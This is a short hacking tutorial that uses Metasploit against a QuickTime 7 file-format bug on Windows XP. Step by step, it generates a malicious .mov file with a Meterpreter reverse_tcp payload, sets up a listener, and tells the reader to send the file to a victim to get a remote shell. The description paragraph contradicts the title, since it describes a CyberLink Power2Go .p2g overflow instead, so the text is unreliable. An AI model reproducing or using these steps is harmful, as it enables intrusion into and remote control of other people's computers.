Hack Remote Windows PC using Apple Quicktime 7 Invalid Atom Length Buffer Overflow

This module exploits a stack buffer overflow in Cyber Link Power2Go version 8.x the vulnerability is triggered when opening a malformed p2g file containing an overly long string in the ‘name’ attribute of the file element. This results in overwriting a structured exception handler record.
Apple Quicktime 7.7.3
Internet Explorer 8
Windows XP SP3
Attacker: Kali Linux
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/apple_quicktime_rdrf
msf exploit (apple_quicktime_rdrf)>set payload windows/meterpreter/reverse_tcp
msf exploit (apple_quicktime_rdrf)>set lhost 192.168.1.6 (IP of Local Host)
msf exploit (apple_quicktime_rdrf)>exploit 

After we successfully generate the malicious mov File, it will stored on your local computer
/root/.msf4/local/msf.mov

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.6
exploit
Now send your msf.mov files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
